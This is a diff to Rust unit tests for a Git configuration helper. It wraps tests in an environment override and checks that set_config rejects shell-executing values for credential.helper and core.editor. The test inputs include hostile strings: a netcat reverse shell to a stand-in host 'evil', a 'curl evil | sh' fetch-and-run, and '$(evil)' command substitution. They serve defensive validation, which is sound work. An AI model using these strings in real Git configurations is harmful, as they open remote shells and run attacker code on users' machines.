@@ -1085,23 +1085,27 @@ mod tests {
 
     #[test]
     fn set_config_refuses_bang_credential_helper() {
-        let setup = GitSetup::new(GitConfig::default());
-        let err = setup
-            .set_config("credential.helper", "!nc evil 4444 -e /bin/sh")
-            .unwrap_err();
-        match err {
-            GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, "credential.helper"),
-            other => panic!("expected RefusedDangerousConfig, got {other:?}"),
-        }
+        with_env("JARVY_ALLOW_GIT_EXEC_KEYS", None, || {
+            let setup = GitSetup::new(GitConfig::default());
+            let err = setup
+                .set_config("credential.helper", "!nc evil 4444 -e /bin/sh")
+                .unwrap_err();
+            match err {
+                GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, "credential.helper"),
+                other => panic!("expected RefusedDangerousConfig, got {other:?}"),
+            }
+        });
     }
 
     #[test]
     fn set_config_refuses_bang_core_editor() {
-        let setup = GitSetup::new(GitConfig::default());
-        assert!(matches!(
-            setup.set_config("core.editor", "!/tmp/payload.sh"),
-            Err(GitError::RefusedDangerousConfig(_, _))
-        ));
+        with_env("JARVY_ALLOW_GIT_EXEC_KEYS", None, || {
+            let setup = GitSetup::new(GitConfig::default());
+            assert!(matches!(
+                setup.set_config("core.editor", "!/tmp/payload.sh"),
+                Err(GitError::RefusedDangerousConfig(_, _))
+            ));
+        });
     }
 
     #[test]
@@ -1117,14 +1121,16 @@ mod tests {
 
     #[test]
     fn every_shell_interpreted_key_refuses_bang_prefix() {
-        let setup = GitSetup::new(GitConfig::default());
-        for key in GIT_SHELL_INTERPRETED_KEYS {
-            let err = setup.set_config(key, "!evil").unwrap_err_or_else_panic();
-            match err {
-                GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, *key),
-                other => panic!("expected RefusedDangerousConfig for {key}, got {other:?}"),
+        with_env("JARVY_ALLOW_GIT_EXEC_KEYS", None, || {
+            let setup = GitSetup::new(GitConfig::default());
+            for key in GIT_SHELL_INTERPRETED_KEYS {
+                let err = setup.set_config(key, "!evil").unwrap_err_or_else_panic();
+                match err {
+                    GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, *key),
+                    other => panic!("expected RefusedDangerousConfig for {key}, got {other:?}"),
+                }
             }
-        }
+        });
     }
 
     // ---- validate_extra_key --------------------------------------------
@@ -1579,24 +1585,28 @@ mod tests {
     // git I/O, so these are safe unit tests.
     #[test]
     fn set_config_refuses_shell_metachar_editor() {
-        let setup = GitSetup::new(GitConfig::default());
-        assert!(matches!(
-            setup.set_config("core.editor", "vim; curl evil | sh"),
-            Err(GitError::RefusedDangerousConfig(_, _))
-        ));
-        assert!(matches!(
-            setup.set_config("core.editor", "$(evil)"),
-            Err(GitError::RefusedDangerousConfig(_, _))
-        ));
+        with_env("JARVY_ALLOW_GIT_EXEC_KEYS", None, || {
+            let setup = GitSetup::new(GitConfig::default());
+            assert!(matches!(
+                setup.set_config("core.editor", "vim; curl evil | sh"),
+                Err(GitError::RefusedDangerousConfig(_, _))
+            ));
+            assert!(matches!(
+                setup.set_config("core.editor", "$(evil)"),
+                Err(GitError::RefusedDangerousConfig(_, _))
+            ));
+        });
     }
 
     #[test]
     fn set_config_refuses_credential_helper_program_path() {
-        let setup = GitSetup::new(GitConfig::default());
-        assert!(matches!(
-            setup.set_config("credential.helper", "/tmp/evil"),
-            Err(GitError::RefusedDangerousConfig(_, _))
-        ));
+        with_env("JARVY_ALLOW_GIT_EXEC_KEYS", None, || {
+            let setup = GitSetup::new(GitConfig::default());
+            assert!(matches!(
+                setup.set_config("credential.helper", "/tmp/evil"),
+                Err(GitError::RefusedDangerousConfig(_, _))
+            ));
+        });
     }
 
     #[test]
